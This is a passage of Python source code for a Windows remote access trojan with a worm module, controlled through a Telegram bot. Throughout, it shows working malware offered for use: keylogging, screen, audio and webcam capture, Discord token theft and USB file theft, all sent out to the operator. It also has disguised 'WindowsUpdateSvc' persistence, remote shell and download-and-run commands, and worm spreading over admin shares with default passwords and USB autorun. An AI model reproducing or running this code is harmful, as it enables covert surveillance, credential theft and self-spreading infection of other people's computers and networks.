    cur.execute("SELECT id, content, file_path, data_type FROM collected_data WHERE sent=0 ORDER BY id ASC LIMIT 50")
    for item in cur.fetchall():
        id_, content, fpath, dtype = item
        if fpath and os.path.exists(fpath):
            if dtype in ["screenshot","jpg","png"]:
                tg_send_photo(fpath, dtype)
            else:
                tg_send_file(fpath, dtype)
            try:
                os.remove(fpath)
            except:
                pass
        elif content:
            tg_send_msg(f"{dtype}: {content[:3000]}")
        cur.execute("UPDATE collected_data SET sent=1 WHERE id=?", (id_,))
    cur.execute("SELECT id, data FROM keystrokes WHERE sent=0 ORDER BY id ASC")
    ks = cur.fetchall()
    if ks:
        p = os.path.join(APPDATA_DIR, f"ks_{int(time.time())}.txt")
        with open(p,"w") as f:
            f.write("KEYSTROKE DUMP\n"+"="*40+"\n\n")
            f.write("".join(k for _,k in ks))
        tg_send_file(p, "Keystroke Log")
        try:
            os.remove(p)
        except:
            pass
        for r in ks:
            cur.execute("UPDATE keystrokes SET sent=1 WHERE id=?", (r[0],))
    cur.execute("SELECT id, source, token_type, token_value FROM tokens WHERE sent=0")
    tokens = cur.fetchall()
    if tokens:
        tg_send_msg("Tokens:\n" + "\n".join(f"  [{s}/{tt}] {tv[:50]}..." for _,s,tt,tv in tokens))
        for r in tokens:
            cur.execute("UPDATE tokens SET sent=1 WHERE id=?", (r[0],))
    conn.commit()
    conn.close()
    return f"Flushed: {len(wifis)} WiFi, {len(browser_creds)} browser creds, {len(ks)} keystrokes, {len(tokens)} tokens"

def cmd_clear():
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    for t in ["collected_data","wifi_passwords","keystrokes","tokens","browser_credentials","worm_targets"]:
        cur.execute(f"DELETE FROM {t}")
    conn.commit()
    conn.close()
    cleanup_tracked_files()
    return "Database cleared"

def cmd_keylog_start():
    global _listener
    if not PYNPUT_AVAILABLE:
        return "pynput not installed"
    try:
        def on_press(key):
            try:
                k = key.char if hasattr(key,'char') and key.char else f"[{key}]"
                window = get_active_window_title()
                if window:
                    k = f"[{window}] {k}"
                store_keystroke(k)
            except:
                pass
        _listener = keyboard.Listener(on_press=on_press)
        _listener.start()
        return "Keylogger started (window-aware)"
    except:
        return "Failed"

def cmd_keylog_stop():
    global _listener
    if _listener:
        _listener.stop()
        _listener = None
    return "Keylogger stopped. Use /flush to send"

def start_screen_recording(seconds_str):
    global _recording_thread, _recording_active
    if _recording_active:
        return "Already recording! Use /stop"
    try:
        seconds = min(max(int(seconds_str.strip()),5),300)
    except:
        seconds = 30
    if not CV2_AVAILABLE or not NUMPY_AVAILABLE:
        return "Requires: pip install opencv-python numpy"
    _recording_active = True
    _recording_thread = threading.Thread(target=_record_worker, args=(seconds,), daemon=True)
    _recording_thread.start()
    return f"Recording {seconds}s... Use /stop to save"

def _record_worker(seconds):
    global _recording_active
    try:
        fps = 10.0
        output = os.path.join(APPDATA_DIR, f"rec_{int(time.time())}.avi")
        size = (960,540)
        out = cv2.VideoWriter(output, cv2.VideoWriter_fourcc(*"MJPG"), fps, size)
        start = time.time()
        frames = 0
        while _recording_active and (time.time()-start) < seconds:
            try:
                img = ImageGrab.grab().resize(size, Image.LANCZOS)
            except:
                img = ImageGrab.grab().resize(size)
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            frames += 1
            time.sleep(1/fps)
        out.release()
        if frames > 0 and os.path.exists(output) and os.path.getsize(output) > 1000:
            dur = time.time()-start
            tg_send_file(output, f"Recording ({frames}f, {dur:.0f}s, {os.path.getsize(output)//1024}KB)")
            try:
                os.remove(output)
            except:
                pass
        _recording_active = False
    except Exception as e:
        _recording_active = False
        tg_send_msg(f"Recording error: {str(e)[:200]}")

def stop_recording():
    global _recording_active
    if not _recording_active:
        return "No recording in progress"
    _recording_active = False
    return "Stopping... file will be sent when ready"

def record_audio(seconds_str):
    try:
        seconds = min(max(int(seconds_str.strip()),3),60)
    except:
        seconds = 10
    if not SOUNDDEVICE_AVAILABLE or not SOUNDFILE_AVAILABLE:
        return "Requires: pip install sounddevice soundfile"
    try:
        fs = 44100
        tg_send_msg(f"Recording audio ({seconds}s)...")
        recording = sd.rec(int(seconds*fs), samplerate=fs, channels=1, dtype='float32')
        sd.wait()
        path = os.path.join(APPDATA_DIR, f"audio_{int(time.time())}.wav")
        sf.write(path, recording, fs)
        if os.path.getsize(path) > 100:
            tg_send_audio(path, f"Audio ({seconds}s, {os.path.getsize(path)//1024}KB)")
            try:
                os.remove(path)
            except:
                pass
            return f"Audio sent ({seconds}s)"
        return "Audio too small"
    except Exception as e:
        return f"Audio error: {str(e)[:200]}"

def cmd_webcam():
    if not CV2_AVAILABLE or not NUMPY_AVAILABLE:
        return "Requires: pip install opencv-python numpy"
    try:
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cam.isOpened():
            cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return "No webcam found"
        for _ in range(10):
            ret, frame = cam.read()
            if ret:
                break
            time.sleep(0.05)
        cam.release()
        if not ret:
            return "Could not capture frame"
        path = os.path.join(APPDATA_DIR, f"cam_{int(time.time())}.jpg")
        cv2.putText(frame, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), (10,30),
            cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0,255,0), 2)
        cv2.imwrite(path, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        if os.path.getsize(path) > 1000:
            tg_send_photo(path, "Webcam Capture")
            try:
                os.remove(path)
            except:
                pass
            return "Webcam photo sent"
        return "Image too small"
    except Exception as e:
        return f"Webcam error: {str(e)[:200]}"

def cmd_scan():
    try:
        output = subprocess.check_output("arp -a", shell=True, creationflags=0x08000000, timeout=10).decode("utf-8", errors="ignore")
        devices = []
        for line in output.split("\n"):
            m = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([\da-f-]+)', line.lower())
            if m:
                ip, mac = m.group(1), m.group(2).replace('-',':')
                if ip != "224.0.0.0" and not ip.startswith("255"):
                    devices.append(f"{ip} -> {mac}")
        return "Local Network:\n" + "\n".join(devices[:30]) if devices else "No devices found"
    except:
        return "Scan failed"

def cmd_whois(data):
    if not data:
        return "Usage: /whois <ip or domain>"
    try:
        r = requests.get(f"http://ip-api.com/json/{data.strip()}", timeout=5)
        d = r.json()
        if d.get("status") == "success":
            return (f"WHOIS: {data}\nIP: {d.get('query','?')}\n"
                    f"Country: {d.get('country','?')} ({d.get('countryCode','?')})\n"
                    f"Region: {d.get('regionName','?')}\nCity: {d.get('city','?')}\n"
                    f"ISP: {d.get('isp','?')}\nOrg: {d.get('org','?')}\nAS: {d.get('as','?')}\n"
                    f"Lat/Lon: {d.get('lat','?')}, {d.get('lon','?')}")
        return f"No data for {data}"
    except:
        return f"Lookup failed for {data}"

def extract_discord_tokens():
    tokens = []
    paths = [
        os.path.join(os.environ.get('APPDATA',''), 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.environ.get('APPDATA',''), 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.environ.get('APPDATA',''), 'discordptb', 'Local Storage', 'leveldb'),
    ]
    patterns = [re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'), re.compile(r'mfa\.[\w-]{84}')]
    for path in paths:
        if not os.path.exists(path):
            continue
        try:
            for fname in os.listdir(path):
                if fname.endswith(('.ldb','.log')):
                    try:
                        with open(os.path.join(path,fname),'r',errors='ignore') as f:
                            content = f.read()
                            for pat in patterns:
                                for token in pat.findall(content):
                                    if token not in tokens:
                                        tokens.append(token)
                                        store_data("discord_token", content=token)
                    except:
                        continue
        except:
            continue
    return tokens

def cmd_tokens_extract(args):
    tokens = extract_discord_tokens()
    if not tokens:
        return "No tokens found"
    p = os.path.join(APPDATA_DIR, f"tokens_{int(time.time())}.txt")
    with open(p,"w") as f:
        for t in tokens:
            f.write(f"{t}\n")
    tg_send_file(p, f"Extracted {len(tokens)} tokens")
    try:
        os.remove(p)
    except:
        pass
    return f"Found {len(tokens)} tokens (file sent)"

def list_usb_drives():
    drives = []
    try:
        for letter in string.ascii_uppercase:
            path = f"{letter}:\\"
            if os.path.exists(path):
                try:
                    if win32api.GetDriveType(path) == 2:
                        drives.append(path)
                except:
                    continue
    except:
        pass
    return drives

def copy_usb_files(drive_letter=None):
    if drive_letter:
        drives = [drive_letter]
    else:
        drives = list_usb_drives()
    if not drives:
        return "No USB drives found"
    results = []
    exts = ['.pdf','.doc','.docx','.xls','.xlsx','.txt','.jpg','.png','.zip','.rar','.7z','.sql','.db','.kdbx','.ovpn','.pem','.key']
    for drive in drives:
        copied = 0
        dest = os.path.join(APPDATA_DIR, 'usb_dump')
        os.makedirs(dest, exist_ok=True)
        try:
            for root, dirs, files in os.walk(drive):
                if 'System Volume Information' in root:
                    continue
                for fname in files:
                    if os.path.splitext(fname)[1].lower() in exts:
                        try:
                            src = os.path.join(root, fname)
                            if os.path.getsize(src) > 5*1024*1024:
                                continue
                            shutil.copy2(src, os.path.join(dest, f"{uuid.uuid4().hex[:8]}_{fname}"))
                            copied += 1
                        except:
                            continue
            if copied:
                results.append(f"{drive}: {copied} files")
                archive = os.path.join(APPDATA_DIR, 'usb_dump')
                shutil.make_archive(archive, 'zip', dest)
                store_data("usb_dump", file_path=archive+'.zip')
                shutil.rmtree(dest, ignore_errors=True)
        except:
            results.append(f"{drive}: Access denied")
    return "\n".join(results) if results else "No files copied"

def cmd_usb(args):
    drives = list_usb_drives()
    return "USB Drives:\n" + "\n".join(drives) if drives else "No USB drives found"

def cmd_usb_copy(drive):
    return copy_usb_files(drive if drive else None)

def cmd_emergency():
    global _emergency_activated
    _emergency_activated = True
    try:
        with open(EMERGENCY_KILL_FILE,"w") as f:
            f.write(datetime.now().isoformat())
    except:
        pass
    return "EMERGENCY STOP ACTIVE — All operations halted. Use /resume."

def cmd_resume():
    global _emergency_activated
    _emergency_activated = False
    try:
        os.remove(EMERGENCY_KILL_FILE)
    except:
        pass
    return "Resumed — operations back online."

# --- Dangerous actions ---
def cmd_lock():
    ctypes.windll.user32.LockWorkStation()
    return "🔒 Workstation locked"

def cmd_shutdown():
    subprocess.run(["shutdown","/s","/t","10","/c","System update"], timeout=5)
    return "💀 Shutdown in 10s"

def cmd_restart():
    subprocess.run(["shutdown","/r","/t","10","/c","System update"], timeout=5)
    return "🔄 Restart in 10s"

def cmd_persistence():
    try:
        exe = sys.argv[0]
        if not os.path.exists(exe):
            return "Cannot determine exe path"
        try:
            k = winreg.HKEY_CURRENT_USER
            h = winreg.OpenKey(k, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(h, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{exe}"')
            winreg.CloseKey(h)
        except:
            pass
        try:
            ps = f'''
            $f=([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
            $f.QueryLanguage="WQL";$f.Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            $f.Name="WindowsUpdateSvc";$f.Put()
            $c=([wmiclass]"\\\\.\\root\\subscription:CommandLineEventConsumer").CreateInstance()
            $c.Name="WindowsUpdateSvc";$c.CommandLineTemplate="{exe}";$c.Put()
            $b=([wmiclass]"\\\\.\\root\\subscription:__FilterToConsumerBinding").CreateInstance()
            $b.Filter=$f;$b.Consumer=$c;$b.Put()
            '''
            subprocess.run(["powershell","-Command",ps], capture_output=True, timeout=15)
        except:
            pass
        try:
            task = f'''
            $a=New-ScheduledTaskAction -Execute "{exe}"
            $t=New-ScheduledTaskTrigger -AtStartup
            $p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            Register-ScheduledTask -TaskName "WindowsUpdateSvc" -Action $a -Trigger $t -Principal $p -Force
            '''
            subprocess.run(["powershell","-Command",task], capture_output=True, timeout=15)
        except:
            pass
        return "✅ Persistence installed (Run + WMI + Task)"
    except Exception as e:
        return f"❌ Persistence error: {str(e)[:200]}"

def cmd_remove():
    try:
        try:
            h = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(h, "WindowsUpdateSvc")
            except:
                pass
            winreg.CloseKey(h)
        except:
            pass
        subprocess.run(["powershell","-Command",
            "Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name='WindowsUpdateSvc'\" | Remove-WmiObject;"
            "Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name='WindowsUpdateSvc'\" | Remove-WmiObject"],
            capture_output=True, timeout=15)
        subprocess.run(["powershell","-Command","Unregister-ScheduledTask -TaskName 'WindowsUpdateSvc' -Confirm:$false"],
            capture_output=True, timeout=15)
        cleanup_tracked_files()
        try:
            os.remove(EMERGENCY_KILL_FILE)
        except:
            pass
        try:
            for f in os.listdir(APPDATA_DIR):
                try:
                    os.remove(os.path.join(APPDATA_DIR,f))
                except:
                    pass
            try:
                os.rmdir(APPDATA_DIR)
            except:
                pass
        except:
            pass
        bat = os.path.join(tempfile.gettempdir(), f"cl_{uuid.uuid4().hex[:8]}.bat")
        with open(bat,"w") as f:
            f.write(f'@echo off\ntimeout /t 2 /nobreak >nul\ndel "{sys.argv[0]}"\ndel "%~f0"')
        subprocess.Popen(["cmd","/c",bat], creationflags=0x08000000)
        return "💥 Self-destruct complete. RAT removed."
    except Exception as e:
        return f"❌ Remove error: {str(e)[:200]}"

def cmd_wipe():
    try:
        cmd_remove()
    except:
        pass
    try:
        for root, dirs, files in os.walk(os.environ.get('TEMP','.')):
            for f in files:
                if '.rat_' in f or 'hackerai' in f.lower():
                    try:
                        os.remove(os.path.join(root,f))
                    except:
                        pass
    except:
        pass
    return "🧹 Wipe complete."

def cmd_reset_rat():
    try:
        if os.path.exists(INSTALL_FLAG):
            os.remove(INSTALL_FLAG)
        conn = sqlite3.connect(DB_PATH, timeout=5)
        cur = conn.cursor()
        for t in ["collected_data","wifi_passwords","keystrokes","tokens","browser_credentials","worm_targets"]:
            cur.execute(f"DELETE FROM {t}")
        conn.commit()
        conn.close()
        cleanup_tracked_files()
    except:
        pass
    return "🔄 RAT reset complete."

# ═══════════════════════════ WORM PROPAGATION MODULE ═══════════════════════════
_worm_enabled = True
_worm_interval_minutes = 60

def worm_scan_network():
    """Discover live hosts on local subnet using ARP and ping."""
    targets = []
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        subnet = ".".join(local_ip.split(".")[:3]) + ".1/24"
        network = ipaddress.ip_network(subnet, strict=False)
        for ip in network.hosts():
            ip_str = str(ip)
            if ip_str == local_ip:
                continue
            try:
                res = subprocess.run(["ping", "-n", "1", "-w", "300", ip_str],
                                     capture_output=True, timeout=1)
                if res.returncode == 0:
                    targets.append(ip_str)
            except:
                pass
    except:
        pass
    try:
        output = subprocess.check_output("arp -a", shell=True, creationflags=0x08000000, timeout=5).decode("utf-8", errors="ignore")
        for line in output.split("\n"):
            m = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([\da-f-]+)', line.lower())
            if m:
                ip = m.group(1)
                if ip != "224.0.0.0" and not ip.startswith("255") and ip != "127.0.0.1":
                    if ip not in targets:
                        targets.append(ip)
    except:
        pass
    return targets

def worm_attempt_infect(ip):
    try:
        exe_path = sys.argv[0]
        if not os.path.exists(exe_path):
            return False
        remote_path = f"\\\\{ip}\\ADMIN$\\WindowsUpdateSvc.exe"
        creds = [
            ("Administrator", ""),
            ("Admin", ""),
            ("Guest", ""),
            ("User", ""),
            ("Administrator", "password"),
            ("Admin", "admin"),
            ("Administrator", "123456"),
            ("Administrator", "123"),
            ("Administrator", "admin"),
        ]
        for user, pwd in creds:
            try:
                use_cmd = f"net use \\\\{ip}\\ADMIN$ /user:{user} {pwd}"
                subprocess.run(use_cmd, shell=True, capture_output=True, timeout=5)
                shutil.copy2(exe_path, remote_path)
                sch_cmd = f'schtasks /create /s {ip} /u {user} /p {pwd} /tn "WindowsUpdateSvc" /tr "{remote_path}" /sc onstart /ru SYSTEM /f'
                subprocess.run(sch_cmd, shell=True, capture_output=True, timeout=10)
                subprocess.run(f"net use \\\\{ip}\\ADMIN$ /delete", shell=True, capture_output=True, timeout=5)
                conn = sqlite3.connect(DB_PATH, timeout=5)
                cur = conn.cursor()
                cur.execute("INSERT INTO worm_targets (ip, status, discovered, last_attempt) VALUES (?, 'infected', ?, ?)",
                            (ip, datetime.now().isoformat(), datetime.now().isoformat()))
                conn.commit()
                conn.close()
                tg_send_msg(f"🐛 Worm infected {ip} using {user}")
                return True
            except:
                try:
                    subprocess.run(f"net use \\\\{ip}\\ADMIN$ /delete", shell=True, capture_output=True, timeout=5)
                except:
                    pass
                continue
        return False
    except:
        return False

def worm_usb_infect():
    drives = list_usb_drives()
    infected = 0
    exe_path = sys.argv[0]
    if not os.path.exists(exe_path):
        return 0
    for drive in drives:
        try:
            dest = os.path.join(drive, "WindowsUpdateSvc.exe")
            shutil.copy2(exe_path, dest)
            ctypes.windll.kernel32.SetFileAttributesW(dest, 2)
            au_path = os.path.join(drive, "autorun.inf")
            with open(au_path, "w") as f:
                f.write("[AutoRun]\n")
                f.write("open=WindowsUpdateSvc.exe\n")
                f.write("action=Open folder to view files\n")
                f.write("shell\\open\\command=WindowsUpdateSvc.exe\n")
            ctypes.windll.kernel32.SetFileAttributesW(au_path, 2)
            infected += 1
        except:
            pass
    return infected

def worm_spread():
    global _worm_enabled
    if not _worm_enabled or _emergency_activated:
        return
    tg_send_msg("🐛 Worm: Starting propagation cycle...")
    try:
        targets = worm_scan_network()
        conn = sqlite3.connect(DB_PATH, timeout=5)
        cur = conn.cursor()
        for ip in targets:
            cur.execute("SELECT status FROM worm_targets WHERE ip=?", (ip,))
            row = cur.fetchone()
            if row and row[0] in ("infected", "pending"):
                continue
            cur.execute("INSERT INTO worm_targets (ip, discovered, last_attempt) VALUES (?, ?, ?)",
                        (ip, datetime.now().isoformat(), datetime.now().isoformat()))
            conn.commit()
            if worm_attempt_infect(ip):
                cur.execute("UPDATE worm_targets SET status='infected' WHERE ip=?", (ip,))
                conn.commit()
        conn.close()
        usb_inf = worm_usb_infect()
        if usb_inf > 0:
            tg_send_msg(f"🐛 Worm infected {usb_inf} USB drives")
        for share in ["C$", "D$", "E$", "ADMIN$"]:
            try:
                for ip in targets[:20]:
                    remote = f"\\\\{ip}\\{share}"
                    dest = f"{remote}\\WindowsUpdateSvc.exe"
                    try:
                        shutil.copy2(sys.argv[0], dest)
                        tg_send_msg(f"🐛 Worm copied to {remote}")
                    except:
                        pass
            except:
                pass
    except Exception as e:
        tg_send_msg(f"🐛 Worm error: {str(e)[:200]}")

def worm_status():
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM worm_targets")
    total = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM worm_targets WHERE status='infected'")
    infected = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM worm_targets WHERE status='pending'")
    pending = cur.fetchone()[0]
    conn.close()
    return (f"🐛 Worm Status\n"
            f"  Enabled: {_worm_enabled}\n"
            f"  Interval: {_worm_interval_minutes} min\n"
            f"  Total targets: {total}\n"
            f"  Infected: {infected}\n"
            f"  Pending: {pending}")

def cmd_worm_scan(args):
    tg_send_msg("🐛 Scanning network for targets...")
    targets = worm_scan_network()
    if not targets:
        return "No targets found."
    conn = sqlite3.connect(DB_PATH, timeout=5)
    cur = conn.cursor()
    for ip in targets:
        cur.execute("SELECT status FROM worm_targets WHERE ip=?", (ip,))
        if not cur.fetchone():
            cur.execute("INSERT INTO worm_targets (ip, discovered, last_attempt) VALUES (?, ?, ?)",
                        (ip, datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return f"Found {len(targets)} hosts:\n" + "\n".join(targets[:30])

def cmd_worm_spread(args):
    threading.Thread(target=worm_spread, daemon=True).start()
    return "🐛 Worm propagation started in background."

def cmd_worm_interval(args):
    global _worm_interval_minutes
    try:
        val = int(args.strip())
        if val < 1:
            val = 1
        _worm_interval_minutes = val
        return f"🐛 Worm interval set to {val} minutes."
    except:
        return "Usage: /worm_interval <minutes>"

def cmd_worm_usb(args):
    cnt = worm_usb_infect()
    return f"🐛 USB infection: {cnt} drives infected."

def cmd_worm_stop(args):
    global _worm_enabled
    _worm_enabled = False
    return "🐛 Worm propagation paused."

def cmd_worm_start(args):
    global _worm_enabled
    _worm_enabled = True
    return "🐛 Worm propagation resumed."

# ═══════════════════════════ COOLDOWN ═══════════════════════════
def check_cooldown(command, args=""):
    global _last_executed
    SAFE = ["/emergency","/resume","/status","/help","/start","/history","/stored","/stop","/stop_recording",
            "/worm_status","/worm_scan","/worm_spread","/worm_interval","/worm_usb","/worm_stop","/worm_start"]
    if command in SAFE:
        return 0
    key = f"{command}|{args}"
    now = time.time()
    if key in _last_executed:
        elapsed = now - _last_executed[key]
        remaining = CMD_COOLDOWN_SECONDS - elapsed
        if remaining > 0:
            return round(remaining, 1)
    return 0

def set_cooldown(command, args=""):
    global _last_executed
    SAFE = ["/emergency","/resume","/status","/help","/start","/history","/stored","/stop","/stop_recording",
            "/worm_status","/worm_scan","/worm_spread","/worm_interval","/worm_usb","/worm_stop","/worm_start"]
    if command in SAFE:
        return
    key = f"{command}|{args}"
    _last_executed[key] = time.time()
    _last_executed = {k:v for k,v in _last_executed.items() if time.time()-v < CMD_COOLDOWN_SECONDS*2}

# ═══════════════════════════ COMMAND MAPS ═══════════════════════════
DIRECT_CMDS = {
    "/help": lambda a: cmd_help(),
    "/start": lambda a: cmd_help(),
    "/emergency": lambda a: cmd_emergency(),
    "/resume": lambda a: cmd_resume(),
    "/status": lambda a: cmd_status(),
    "/history": lambda a: cmd_history(),
    "/info": lambda a: cmd_info(),
    "/report": lambda a: cmd_full_report(a),
    "/report_full": lambda a: cmd_full_report(a),
    "/ip": lambda a: "IP Info\n" + "\n".join(f"  {k}: {v}" for k,v in get_ip_info().items()),
    "/geo": lambda a: get_geo() or "No geo data",
    "/ss": lambda a: screenshot_cmd(),
    "/screenshot": lambda a: screenshot_cmd(),
    "/wifi": lambda a: "\n".join(["WiFi Networks:"] + grab_wifi_passwords_detailed()) or "No WiFi found",
    "/capture": lambda a: cmd_capture(),
    "/clipboard": lambda a: cmd_clipboard(),
    "/processes": lambda a: cmd_processes(),
    "/ps": lambda a: cmd_processes(),
    "/cmd": lambda a: cmd_cmd(a) if a else "Usage: /cmd <command>",
    "/shell": lambda a: cmd_cmd(a) if a else "Usage: /shell <command>",
    "/popup": lambda a: cmd_popup(a),
    "/msgbox": lambda a: handle_msgbox(a),
    "/speak": lambda a: handle_speak(a),
    "/tts": lambda a: handle_speak(a),
    "/browse": lambda a: cmd_browse(a) if a else "Usage: /browse <url>",
    "/kill": lambda a: cmd_kill(a.strip()) if a.strip() else "Usage: /kill <pid>",
    "/download": lambda a: cmd_download(a) if a else "Usage: /download <url>",
    "/exec": lambda a: cmd_exec(a) if a else "Usage: /exec <url>",
    "/stored": lambda a: cmd_stored(),
    "/flush": lambda a: cmd_flush(),
    "/clear": lambda a: cmd_clear(),
    "/key_start": lambda a: cmd_keylog_start(),
    "/keylog_start": lambda a: cmd_keylog_start(),
    "/key_stop": lambda a: cmd_keylog_stop(),
    "/keylog_stop": lambda a: cmd_keylog_stop(),
    "/record": lambda a: start_screen_recording(a or "30"),
    "/stop_recording": lambda a: stop_recording(),
    "/stop": lambda a: stop_recording(),
    "/record_audio": lambda a: record_audio(a or "10"),
    "/audio": lambda a: record_audio(a or "10"),
    "/webcam": lambda a: cmd_webcam(),
    "/camera": lambda a: cmd_webcam(),
    "/scan": lambda a: cmd_scan(),
    "/net": lambda a: cmd_scan(),
    "/whois": lambda a: cmd_whois(a) if a else "Usage: /whois <ip or domain>",
    "/browser": lambda a: cmd_browser_full_report(a),
    "/tokens": lambda a: cmd_tokens_extract(a),
    "/discord": lambda a: cmd_tokens_extract(a),
    "/usb": lambda a: cmd_usb(a),
    "/usb_copy": lambda a: cmd_usb_copy(a),
    "/lock": lambda a: cmd_lock(),
    "/shutdown": lambda a: cmd_shutdown(),
    "/restart": lambda a: cmd_restart(),
    "/persist": lambda a: cmd_persistence(),
    "/remove": lambda a: cmd_remove(),
    "/wipe": lambda a: cmd_wipe(),
    "/reset": lambda a: cmd_reset_rat(),
    # Worm commands
    "/worm_status": lambda a: worm_status(),
    "/worm_scan": lambda a: cmd_worm_scan(a),
    "/worm_spread": lambda a: cmd_worm_spread(a),
    "/worm_interval": lambda a: cmd_worm_interval(a),
    "/worm_usb": lambda a: cmd_worm_usb(a),
    "/worm_stop": lambda a: cmd_worm_stop(a),
    "/worm_start": lambda a: cmd_worm_start(a),
}

DANGEROUS_WITH_ABORT = {}

# ═══════════════════════════ COMMAND PROCESSOR ═══════════════════════════
def process_command(text, msg_id=None):
    if not text:
        return None
    text = text.strip()
    if not text.startswith("/"):
        return None
    parts = text.split(" ", 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    SAFE = ["/emergency","/resume","/status","/help","/start","/history","/stored","/stop","/stop_recording",
            "/worm_status","/worm_scan","/worm_spread","/worm_interval","/worm_usb","/worm_stop","/worm_start"]
    if cmd not in SAFE:
        remaining = check_cooldown(cmd, args)
        if remaining > 0:
            return f"Cooldown: {remaining}s remaining"

    handler = DIRECT_CMDS.get(cmd)
    if handler:
        start_t = time.time()
        result = handler(args)
        duration = int((time.time()-start_t)*1000)
        if cmd not in SAFE:
            set_cooldown(cmd, args)
            log_command(cmd, args, msg_id, duration_ms=duration)
        if isinstance(result, tuple):
            text_result, keyboard = result
            if len(str(text_result)) > 4000:
                return str(text_result)[:4000] + "\n\n...(truncated)"
            return result
        if result and len(str(result)) > 4000:
            return str(result)[:4000] + "\n\n...(truncated)"
        return result

    danger_handler = DANGEROUS_WITH_ABORT.get(cmd)
    if danger_handler:
        cmd_name = cmd.lstrip("/")
        return send_with_abort(cmd_name, args, f"Executing: `/{cmd_name} {args}`", danger_handler)

    return None

# ═══════════════════════════ STARTUP ═══════════════════════════
def send_branded_startup():
    img_url = "https://raw.githubusercontent.com/devopcoder/Bot-css-1-11/main/rat-blog-cover-min.jpg"
    try:
        requests.post(f"{API_URL}/sendPhoto", data={
            "chat_id": CHAT_ID,
            "photo": img_url,
            "caption": "THE RAT HAS BEEN ON 😎😎😎"
        }, timeout=15)
    except:
        tg_send_msg("THE RAT HAS BEEN ON 😎😎😎")
    time.sleep(1.5)
    try:
        ip_info = get_ip_info()
        geo_info = get_geo()
        sys_info = get_system_info()
        card_path = None
        try:
            card_path = create_info_card(ip_info, geo_info, sys_info)
        except:
            pass
        if card_path and os.path.exists(card_path):
            try:
                tg_send_photo(card_path, "System Intelligence Report")
            except:
                try:
                    tg_send_file(card_path, "System Intelligence Report")
                except:
                    pass
            try:
                os.remove(card_path)
            except:
                pass
        else:
            summary = f"System Intelligence\n  Host: {ip_info.get('hostname','?')}\n  Public: {ip_info.get('public_ip','?')}\n  Local: {ip_info.get('local_ip','?')}\n  OS: {platform.system()} {platform.release()}"
            if geo_info:
                for line in geo_info.split("\n")[:3]:
                    summary += f"\n  {line}"
            tg_send_msg(summary)
        try:
            html_path = generate_html_report()
            if html_path:
                tg_send_file(html_path, f"📊 Full Intelligence Report — {platform.node()}")
                try:
                    os.remove(html_path)
                except:
                    pass
        except:
            pass
        try:
            wifi = grab_wifi_passwords_detailed()
            if wifi:
                p = os.path.join(APPDATA_DIR, f"wifi_{int(time.time())}.txt")
                with open(p,"w") as f:
                    f.write("Wi-Fi NETWORKS\n"+"="*40+"\n\n")
                    for w in wifi:
                        f.write(f"{w}\n")
                tg_send_file(p, "Wi-Fi Networks")
                try:
                    os.remove(p)
                except:
                    pass
        except:
            pass
    except Exception as e:
        tg_send_msg(f"Info: {str(e)[:200]}")
    time.sleep(1)
    try:
        ss = take_screenshot()
        if ss:
            try:
                tg_send_photo(ss, "Initial Screenshot")
            except:
                try:
                    tg_send_file(ss, "Initial Screenshot")
                except:
                    pass
            try:
                os.remove(ss)
            except:
                pass
    except:
        pass
    tg_send_msg("RAT v8.1 (Worm Edition) Ready — /help for commands.")

# ═══════════════════════════ POLLING ═══════════════════════════
def poll_commands():
    global _last_update_id, _connection_quality
    errors = 0
    while True:
        try:
            updates = get_updates(_last_update_id + 1)
            errors = 0
            _connection_quality = min(100, _connection_quality + 5)
            for update in updates:
                _last_update_id = update.get("update_id", _last_update_id)
                callback_query = update.get("callback_query")
                if callback_query:
                    data = callback_query.get("data", "")
                    callback_id = callback_query.get("id", "")
                    message = callback_query.get("message", {})
                    message_id = message.get("message_id")
                    chat_id = message.get("chat", {}).get("id")
                    handle_callback_query(data, callback_id, message_id, chat_id)
                    continue
                msg = update.get("message", {})
                text = msg.get("text", "")
                msg_id = msg.get("message_id")
                if not text:
                    continue
                result = process_command(text, msg_id)
                if result:
                    if isinstance(result, tuple):
                        text_result, keyboard = result
                        if len(str(text_result)) > 3000:
                            p = os.path.join(APPDATA_DIR, f"out_{int(time.time())}.txt")
                            with open(p,"w") as f:
                                f.write(str(text_result))
                            tg_send_file(p, f"Output: {text}")
                            try:
                                os.remove(p)
                            except:
                                pass
                        else:
                            tg_send_msg(text_result, parse_mode="Markdown", keyboard=keyboard)
                    elif len(str(result)) > 3000:
                        p = os.path.join(APPDATA_DIR, f"out_{int(time.time())}.txt")
                        with open(p,"w") as f:
                            f.write(str(result))
                        tg_send_file(p, f"Output: {text}")
                        try:
                            os.remove(p)
                        except:
                            pass
                    else:
                        tg_send_msg(result)
